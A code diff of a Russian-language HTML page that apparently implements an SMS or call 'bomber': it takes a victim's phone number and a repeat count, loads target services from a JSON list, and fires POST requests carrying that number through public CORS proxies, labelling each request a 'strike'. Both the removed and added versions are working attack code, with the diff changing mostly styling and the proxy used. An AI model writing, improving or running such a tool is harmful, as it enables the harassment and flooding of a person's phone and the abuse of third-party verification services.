@@ -11,9 +11,7 @@
         }
 
         * {
-            margin: 0;
-            padding: 0;
-            box-sizing: border-box;
+            margin: 0; padding: 0; box-sizing: border-box;
             -webkit-tap-highlight-color: transparent !important;
         }
 
@@ -25,48 +23,25 @@
         .entry-anim { animation: entry-fade 1.2s cubic-bezier(0.22, 1, 0.36, 1) forwards; }
 
         body {
-            background: var(--bg-glow);
-            color: #eaeaff;
+            background: var(--bg-glow); color: #eaeaff;
             font-family: 'Inter', -apple-system, sans-serif;
-            min-height: 100vh;
-            display: flex;
-            align-items: center;
-            justify-content: center;
-            padding: 1rem;
-            position: relative;
-            user-select: none;
-            overflow: hidden;
+            min-height: 100vh; display: flex; align-items: center;
+            justify-content: center; padding: 1rem; position: relative;
+            user-select: none; overflow: hidden;
         }
 
-        #bg-canvas {
-            position: fixed; top: 0; left: 0; width: 100%; height: 100%; z-index: 1; pointer-events: none;
-        }
-
+        #bg-canvas { position: fixed; top: 0; left: 0; width: 100%; height: 100%; z-index: 1; pointer-events: none; }
         .card { width: 100%; max-width: 320px; text-align: center; position: relative; z-index: 10; }
 
-        .header { 
-            display: flex; 
-            align-items: center; 
-            justify-content: center; 
-            margin-bottom: 1.5rem; 
-            gap: 4px;
-        }
-        .title { 
-            font-size: 2.2rem; 
-            font-weight: 700; 
-            color: #f0f0ff; 
-            text-shadow: 0 0 10px var(--accent); 
-            line-height: 1;
-        }
+        .header { display: flex; align-items: center; justify-content: center; margin-bottom: 1.5rem; gap: 4px; }
+        .title { font-size: 2.2rem; font-weight: 700; color: #f0f0ff; text-shadow: 0 0 10px var(--accent); line-height: 1; }
         
         .bomb-emoji { 
-            font-size: 2.2rem; 
-            cursor: pointer; 
+            font-size: 2.2rem; cursor: pointer; 
             filter: brightness(1.2) contrast(1.1) hue-rotate(220deg) drop-shadow(0 0 5px var(--accent));
-            transition: transform 0.3s ease-out;
-            display: inline-block;
-            line-height: 1;
+            transition: transform 0.3s ease-out; display: inline-block; line-height: 1;
         }
+        .bomb-emoji.active-anim { animation: moon-charge 0.7s ease-in-out forwards; }
 
         @keyframes moon-charge {
             0% { transform: scale(1) rotate(0deg); }
@@ -74,33 +49,21 @@
             100% { transform: scale(1) rotate(0deg); }
         }
 
-        .bomb-emoji.active-anim { animation: moon-charge 0.7s ease-in-out forwards; }
-
         .phone-field {
             display: flex; align-items: center; background: rgba(18, 18, 30, 0.8);
             border: 1px solid #5f5f8f; border-radius: 14px; backdrop-filter: blur(8px);
-            width: 185px; padding: 2px; box-shadow: 0 4px 12px rgba(0, 0, 0, 0.3);
-            transition: 0.3s;
+            width: 185px; padding: 2px; transition: 0.3s;
         }
-        
-        .phone-field.invalid {
-            border-color: #ff4444 !important;
-            animation: error-shake 0.4s cubic-bezier(.36,.07,.19,.97) both;
-        }
-        @keyframes error-shake {
-            0%, 100% { transform: translateX(0); }
-            20%, 60% { transform: translateX(-4px); }
-            40%, 80% { transform: translateX(4px); }
-        }
+        .phone-field.invalid { border-color: #ff4444 !important; animation: shake 0.4s; }
+        @keyframes shake { 0%, 100% {transform:translateX(0)} 25% {transform:translateX(-4px)} 75% {transform:translateX(4px)} }
 
-        .code-selector { padding: 0.3rem 0.5rem; cursor: pointer; border-right: 1px solid #5f5f8f; font-size: 0.8rem; position: relative; color: #f0f0ff; white-space: nowrap; }
+        .code-selector { padding: 0.3rem 0.5rem; cursor: pointer; border-right: 1px solid #5f5f8f; font-size: 0.8rem; position: relative; color: #f0f0ff; }
         .code-dropdown {
-            position: absolute; top: calc(100% + 10px); left: 0; background: rgba(30, 30, 50, 0.98); border: 2px solid var(--accent);
-            border-radius: 14px; display: none; z-index: 1000; min-width: 160px; backdrop-filter: blur(15px);
+            position: absolute; top: calc(100% + 10px); left: 0; background: rgba(30, 30, 50, 0.98); 
+            border: 2px solid var(--accent); border-radius: 14px; display: none; z-index: 1000; min-width: 160px;
         }
-        .code-selector.active .code-dropdown { display: block; animation: entry-fade 0.3s ease-out; }
-        .code-item { padding: 10px 12px; font-size: 0.75rem; border-bottom: 1px solid rgba(255,255,255,0.05); cursor: pointer; text-align: left; }
-        .code-item:hover { background: rgba(180, 180, 255, 0.15); }
+        .code-selector.active .code-dropdown { display: block; }
+        .code-item { padding: 10px; font-size: 0.75rem; border-bottom: 1px solid rgba(255,255,255,0.05); text-align: left; }
 
         .phone-number-input { background: transparent; border: none; color: #fff; font-size: 0.8rem; padding: 5px 6px; outline: none; width: 100%; font-family: 'JetBrains Mono', monospace; }
 
@@ -108,38 +71,25 @@
 
         .repeats {
             display: flex; align-items: center; gap: 3px; background: rgba(20, 20, 35, 0.7);
-            border: 1px solid #5f5f8f; border-radius: 12px; padding: 0 8px; backdrop-filter: blur(8px);
+            border: 1px solid #5f5f8f; border-radius: 12px; padding: 0 8px;
         }
-        .repeats-symbol { font-size: 0.9rem; color: var(--accent); font-weight: bold; }
         .repeats-input { width: 30px; background: transparent; border: none; color: #fff; text-align: center; outline: none; font-weight: 700; font-size: 0.8rem; }
-        
-        .repeats-max { 
-            font-size: 0.6rem; font-family: 'JetBrains Mono', monospace; color: #fff; background: rgba(180,180,255,0.1); 
-            padding: 3px 6px; border-radius: 6px; display: flex; align-items: center; gap: 4px; border: 1px solid rgba(176, 176, 255, 0.3);
-        }
-        
-        .atom-svg { width: 16px; height: 16px; filter: drop-shadow(0 0 5px #8a8aff); }
+        .repeats-max { font-size: 0.6rem; color: #fff; background: rgba(180,180,255,0.1); padding: 3px 6px; border-radius: 6px; display: flex; align-items: center; gap: 4px; }
 
         .attack-btn {
             width: 210px; background: rgba(255, 255, 255, 0.08); border: 1px solid var(--accent);
             border-radius: 100px; color: #fff; padding: 12px; cursor: pointer; font-weight: 700; text-transform: uppercase;
-            letter-spacing: 2px; transition: 0.2s; margin-top: 0.5rem; backdrop-filter: blur(2px);
+            letter-spacing: 2px; transition: 0.2s;
         }
         .attack-btn:active { transform: scale(0.96); }
 
-        .settings-trigger { position: fixed; bottom: 20px; right: 20px; font-size: 1.5rem; color: var(--accent); cursor: pointer; z-index: 100; opacity: 0.5; }
-        
+        .settings-trigger { position: fixed; bottom: 20px; right: 20px; font-size: 1.5rem; color: var(--accent); cursor: pointer; opacity: 0.5; }
         .settings-modal { position: fixed; inset: 0; background: rgba(5, 5, 15, 0.5); backdrop-filter: blur(20px); display: none; align-items: center; justify-content: center; z-index: 3000; }
         .settings-modal.active { display: flex; }
-        .settings-content { 
-            background: rgba(20, 20, 35, 0.85); border: 1px solid var(--accent); border-radius: 28px; 
-            padding: 2.5rem 1.5rem 1.5rem; width: 330px; position: relative; text-align: center; 
-        }
-        
-        .close-settings { position: absolute; top: 15px; right: 20px; font-size: 1.4rem; color: var(--accent); cursor: pointer; }
+        .settings-content { background: rgba(20, 20, 35, 0.85); border: 1px solid var(--accent); border-radius: 28px; padding: 2rem; width: 320px; text-align: center; }
 
         .loading-overlay {
-            position: fixed; inset: 0; background: rgba(10, 10, 20, 0.9);
+            position: fixed; inset: 0; background: rgba(10, 10, 20, 0.95);
             display: none; flex-direction: column; align-items: center; justify-content: center; z-index: 5000;
         }
         .loading-overlay.show { display: flex; }
@@ -162,25 +112,17 @@
             <div class="code-selector" id="codeSelector">
                 <span id="selectedCode">🇷🇺 +7</span>
                 <div class="code-dropdown" id="codeDropdown">
-                    <div class="code-item" data-code="+7">🇷🇺 +7 (Россия)</div>
-                    <div class="code-item" data-code="+380">🇺🇦 +380 (Украина)</div>
-                    <div class="code-item" data-code="+375">🇧🇾 +375 (Беларусь)</div>
-                    <div class="code-item" data-code="+7">🇰🇿 +7 (Казахстан)</div>
+                    <div class="code-item" data-code="+7">🇷🇺 +7</div>
+                    <div class="code-item" data-code="+380">🇺🇦 +380</div>
+                    <div class="code-item" data-code="+375">🇧🇾 +375</div>
                 </div>
             </div>
             <input class="phone-number-input" type="text" id="localNumber" placeholder="912 345 67 89" inputmode="numeric">
         </div>
         
         <div class="repeats">
-            <span class="repeats-symbol">↳↰</span>
             <input class="repeats-input" type="number" id="repeat" value="3" min="1" max="100">
             <span class="repeats-max">
-                <svg class="atom-svg" viewBox="0 0 24 24" fill="none" stroke="#b0b0ff" stroke-width="1.5">
-                    <circle cx="12" cy="12" r="2" fill="#b0b0ff"/>
-                    <ellipse cx="12" cy="12" rx="10" ry="4" transform="rotate(0 12 12)"/>
-                    <ellipse cx="12" cy="12" rx="10" ry="4" transform="rotate(60 12 12)"/>
-                    <ellipse cx="12" cy="12" rx="10" ry="4" transform="rotate(120 12 12)"/>
-                </svg>
                 <span id="servicesCounter">0</span>
             </span>
         </div>
@@ -190,140 +132,139 @@
 </div>
 
 <div class="settings-trigger" id="openSettings">⚙</div>
-
 <div class="settings-modal" id="settingsModal">
     <div class="settings-content">
-        <div class="close-settings" id="closeSettings">✕</div>
-        <div class="title" style="font-size: 1.1rem; margin-bottom: 20px;">CRUX SETTINGS</div>
-        <p style="font-size: 0.8rem; color: var(--accent); margin-bottom: 15px;">Сервисы загружаются из <b>services.json</b></p>
-        <button class="attack-btn" id="reloadServices" style="width:100%;">ОБНОВИТЬ СПИСОК</button>
+        <h3 style="margin-bottom:15px">Настройки</h3>
+        <button class="attack-btn" id="reloadServices" style="width:100%">ОБНОВИТЬ JSON</button>
+        <button class="attack-btn" id="closeSettings" style="width:100%; margin-top:10px; border-color:rgba(255,255,255,0.2)">ЗАКРЫТЬ</button>
     </div>
 </div>
 
 <div class="loading-overlay" id="loadingOverlay">
-    <div style="color:var(--accent); font-family:monospace;" id="statusTxt">Инициализация...</div>
+    <div id="statusTxt" style="font-family:monospace; color:var(--accent)">Подготовка...</div>
     <div class="funny-progress-bg"><div class="funny-progress-fill" id="progressFill"></div></div>
-    <button id="stopAttack" style="margin-top:20px; background:none; border:1px solid #ff4444; color:#ff4444; padding:5px 15px; border-radius:20px; cursor:pointer; font-size:0.7rem;">ОСТАНОВИТЬ</button>
+    <button id="stopAttack" style="margin-top:20px; color:#ff4444; background:none; border:none; cursor:pointer;">ОСТАНОВИТЬ</button>
 </div>
 
 <script>
-    (function() {
-        const canvas = document.getElementById('bg-canvas');
-        const ctx = canvas.getContext('2d');
-        let bgParticles = [], explosionParticles = [], loadedServices = [], isAttacking = false;
-        
-        // ПРОКСИ ДЛЯ ОБХОДА CORS
-        const proxy = "https://corsproxy.io/?";
+(function() {
+    const canvas = document.getElementById('bg-canvas');
+    const ctx = canvas.getContext('2d');
+    let bgParticles = [], explosionParticles = [], loadedServices = [], isAttacking = false;
 
-        function resize() { canvas.width = window.innerWidth; canvas.height = window.innerHeight; }
-        window.addEventListener('resize', resize); resize();
+    // Альтернативный прокси (надежнее)
+    const proxyBase = "https://api.allorigins.win/get?url=";
 
-        class Particle {
-            constructor(x, y, isExplosion = false) { 
-                this.x = x || Math.random() * canvas.width; 
-                this.y = y || Math.random() * canvas.height; 
-                this.isExplosion = isExplosion;
-                this.vx = isExplosion ? (Math.random() - 0.5) * 6 : (Math.random() - 0.5) * 0.4;
-                this.vy = isExplosion ? (Math.random() - 0.5) * 6 : (Math.random() - 0.5) * 0.4;
-                this.alpha = 1;
+    function resize() { canvas.width = window.innerWidth; canvas.height = window.innerHeight; }
+    window.addEventListener('resize', resize); resize();
+
+    class Particle {
+        constructor(x, y, isExplosion = false) { 
+            this.x = x || Math.random() * canvas.width; 
+            this.y = y || Math.random() * canvas.height; 
+            this.isExplosion = isExplosion;
+            this.vx = isExplosion ? (Math.random() - 0.5) * 6 : (Math.random() - 0.5) * 0.4;
+            this.vy = isExplosion ? (Math.random() - 0.5) * 6 : (Math.random() - 0.5) * 0.4;
+            this.alpha = 1;
+        }
+        update() { this.x += this.vx; this.y += this.vy; if (this.isExplosion) this.alpha -= 0.02; }
+        draw() { ctx.fillStyle = "#b0b0ff"; ctx.globalAlpha = this.isExplosion ? this.alpha : 0.4; ctx.beginPath(); ctx.arc(this.x, this.y, this.isExplosion ? 2 : 1.2, 0, Math.PI * 2); ctx.fill(); }
+    }
+
+    for(let i=0; i<50; i++) bgParticles.push(new Particle());
+    function animate() { 
+        ctx.clearRect(0, 0, canvas.width, canvas.height); 
+        bgParticles.forEach(p => { p.update(); if(p.x<0||p.x>canvas.width) p.vx*=-1; if(p.y<0||p.y>canvas.height) p.vy*=-1; p.draw(); }); 
+        explosionParticles.forEach((p, i) => { p.update(); p.draw(); if(p.alpha <= 0) explosionParticles.splice(i, 1); });
+        requestAnimationFrame(animate); 
+    }
+    animate();
+
+    async function loadServices() {
+        try {
+            const res = await fetch('services.json?t=' + Date.now());
+            loadedServices = await res.json();
+        } catch (e) { loadedServices = []; }
+        document.getElementById('servicesCounter').innerText = loadedServices.length;
+    }
+    loadServices();
+
+    async function fire(s, phone) {
+        try {
+            let body = s.body;
+            if (typeof body === 'object') body = JSON.stringify(body).replace(/%phone%/g, phone);
+            else body = body.replace(/%phone%/g, phone);
+
+            // Для AllOrigins мы шлем POST через их структуру, если это возможно, 
+            // но самый надежный способ для чистого фронта — это имитация через прокси-враппер
+            const targetUrl = s.url;
+            
+            // Используем fetch напрямую через corsproxy.io (он лучше жует POST)
+            const proxyUrl = "https://corsproxy.io/?" + encodeURIComponent(targetUrl);
+
+            await fetch(proxyUrl, {
+                method: s.method || 'POST',
+                headers: s.headers || { "Content-Type": "application/json" },
+                body: body
+            });
+        } catch(e) {}
+    }
+
+    async function start(phone) {
+        const reps = parseInt(document.getElementById('repeat').value) || 1;
+        const progress = document.getElementById('progressFill');
+        const status = document.getElementById('statusTxt');
+        isAttacking = true;
+
+        const total = loadedServices.length * reps;
+        let done = 0;
+
+        for (let i = 0; i < reps && isAttacking; i++) {
+            for (let s of loadedServices) {
+                if (!isAttacking) break;
+                await fire(s, phone);
+                done++;
+                progress.style.width = (done / total * 100) + "%";
+                status.innerText = `Удар: ${done}/${total}`;
+                // Небольшая пауза, чтобы не убить поток
+                await new Promise(r => setTimeout(r, 200));
             }
-            update() { this.x += this.vx; this.y += this.vy; if (this.isExplosion) this.alpha -= 0.02; }
-            draw() { ctx.fillStyle = "#b0b0ff"; ctx.globalAlpha = this.isExplosion ? this.alpha : 0.4; ctx.beginPath(); ctx.arc(this.x, this.y, this.isExplosion ? 2 : 1.2, 0, Math.PI * 2); ctx.fill(); }
         }
+        status.innerText = "ЗАВЕРШЕНО";
+        setTimeout(() => { document.getElementById('loadingOverlay').classList.remove('show'); progress.style.width="0%"; }, 1500);
+        isAttacking = false;
+    }
 
-        for(let i=0; i<70; i++) bgParticles.push(new Particle());
-        function animate() { 
-            ctx.clearRect(0, 0, canvas.width, canvas.height); 
-            bgParticles.forEach(p => { p.update(); if(p.x<0||p.x>canvas.width) p.vx*=-1; if(p.y<0||p.y>canvas.height) p.vy*=-1; p.draw(); }); 
-            explosionParticles.forEach((p, i) => { p.update(); p.draw(); if(p.alpha <= 0) explosionParticles.splice(i, 1); });
-            requestAnimationFrame(animate); 
+    document.getElementById('go').onclick = () => {
+        const num = document.getElementById('localNumber').value.replace(/\D/g, '');
+        if (num.length < 7) { 
+            document.getElementById('phoneBox').classList.add('invalid'); 
+            setTimeout(()=>document.getElementById('phoneBox').classList.remove('invalid'), 500); 
+            return; 
         }
-        animate();
+        document.getElementById('loadingOverlay').classList.add('show');
+        const code = document.getElementById('selectedCode').innerText.split(' ').pop().replace('+', '');
+        start(code + num);
+    };
 
-        async function loadServices() {
-            try {
-                const res = await fetch('services.json?nocache=' + Date.now());
-                const data = await res.json();
-                loadedServices = Array.isArray(data) ? data : (data.services || []);
-            } catch (e) { loadedServices = []; }
-            document.getElementById('servicesCounter').innerText = loadedServices.length;
-        }
-        loadServices();
+    document.getElementById('bombLogo').onclick = () => {
+        const b = document.getElementById('bombLogo');
+        b.classList.add('active-anim');
+        setTimeout(() => b.classList.remove('active-anim'), 700);
+        const rect = b.getBoundingClientRect();
+        for(let i=0; i<25; i++) explosionParticles.push(new Particle(rect.left + rect.width/2, rect.top + rect.height/2, true));
+    };
 
-        async function executeRequest(s, phone) {
-            try {
-                const url = proxy + encodeURIComponent(s.url);
-                let body = s.body;
-                
-                if (typeof body === 'object') {
-                    body = JSON.stringify(body).replace(/%phone%/g, phone);
-                } else if (typeof body === 'string') {
-                    body = body.replace(/%phone%/g, phone);
-                }
-
-                await fetch(url, {
-                    method: s.method || 'POST',
-                    headers: s.headers || { "Content-Type": "application/json" },
-                    body: body
-                });
-            } catch(e) {}
-        }
-
-        async function startAttack(phone) {
-            const reps = parseInt(document.getElementById('repeat').value) || 1;
-            const progress = document.getElementById('progressFill');
-            const status = document.getElementById('statusTxt');
-            isAttacking = true;
-
-            const total = loadedServices.length * reps;
-            let done = 0;
-
-            for (let i = 0; i < reps && isAttacking; i++) {
-                for (let s of loadedServices) {
-                    if (!isAttacking) break;
-                    await executeRequest(s, phone);
-                    done++;
-                    progress.style.width = (done / total * 100) + "%";
-                    status.innerText = `Удар: ${done}/${total}`;
-                    await new Promise(r => setTimeout(r, 300)); // Задержка, чтобы не забанили прокси
-                }
-            }
-            status.innerText = "ЗАВЕРШЕНО";
-            setTimeout(() => { document.getElementById('loadingOverlay').classList.remove('show'); progress.style.width="0%"; }, 1500);
-            isAttacking = false;
-        }
-
-        document.getElementById('go').onclick = () => {
-            const num = document.getElementById('localNumber').value.replace(/\D/g, '');
-            if (num.length < 7) { 
-                document.getElementById('phoneBox').classList.add('invalid'); 
-                setTimeout(()=>document.getElementById('phoneBox').classList.remove('invalid'), 500); 
-                return; 
-            }
-            document.getElementById('loadingOverlay').classList.add('show');
-            const code = document.getElementById('selectedCode').innerText.split(' ').pop().replace('+', '');
-            startAttack(code + num);
-        };
-
-        document.getElementById('bombLogo').onclick = () => {
-            const b = document.getElementById('bombLogo');
-            b.classList.add('active-anim');
-            setTimeout(() => b.classList.remove('active-anim'), 700);
-            const rect = b.getBoundingClientRect();
-            for(let i=0; i<30; i++) explosionParticles.push(new Particle(rect.left + rect.width/2, rect.top + rect.height/2, true));
-        };
-
-        document.getElementById('stopAttack').onclick = () => isAttacking = false;
-        document.getElementById('openSettings').onclick = () => document.getElementById('settingsModal').classList.add('active');
-        document.getElementById('closeSettings').onclick = () => document.getElementById('settingsModal').classList.remove('active');
-        document.getElementById('reloadServices').onclick = () => loadServices();
-        document.getElementById('codeSelector').onclick = (e) => { e.stopPropagation(); document.getElementById('codeSelector').classList.toggle('active'); };
-        document.querySelectorAll('.code-item').forEach(i => i.onclick = () => {
-            document.getElementById('selectedCode').innerText = i.innerText.split(' ')[0] + ' ' + i.dataset.code;
-            document.getElementById('codeSelector').classList.remove('active');
-        });
-        window.onclick = () => document.getElementById('codeSelector').classList.remove('active');
-    })();
+    document.getElementById('openSettings').onclick = () => document.getElementById('settingsModal').classList.add('active');
+    document.getElementById('closeSettings').onclick = () => document.getElementById('settingsModal').classList.remove('active');
+    document.getElementById('reloadServices').onclick = () => { loadServices(); document.getElementById('settingsModal').classList.remove('active'); };
+    document.getElementById('stopAttack').onclick = () => isAttacking = false;
+    document.getElementById('codeSelector').onclick = (e) => { e.stopPropagation(); document.getElementById('codeSelector').classList.toggle('active'); };
+    document.querySelectorAll('.code-item').forEach(i => i.onclick = () => {
+        document.getElementById('selectedCode').innerText = i.innerText;
+        document.getElementById('codeSelector').classList.remove('active');
+    });
+})();
 </script>
 </body>
 </html>
